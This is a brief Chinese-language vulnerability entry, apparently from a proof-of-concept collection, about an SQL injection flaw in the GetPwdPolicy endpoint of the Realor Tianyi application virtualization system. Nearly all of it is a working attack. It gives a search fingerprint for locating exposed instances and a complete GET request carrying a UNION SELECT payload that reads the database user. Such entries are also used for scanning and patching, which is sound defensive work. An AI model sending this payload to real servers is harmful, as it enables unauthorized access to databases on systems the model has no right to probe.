# 瑞友天翼应用虚拟化系统GetPwdPolicy存在SQL注入漏洞

瑞友天翼应用虚拟化系统 ｜ SQL注入 ｜ —
- **指纹**：`app="REALOR-天翼应用虚拟化系统"`
- **请求**：`GET /RAPAgent.XGI?CMD=GetPwdPolicy&User=1%27+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CCONCAT%280x7e%2C%28SELECT+user()%29%2C0x7e%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--+- HTTP`
- **响应特征**：200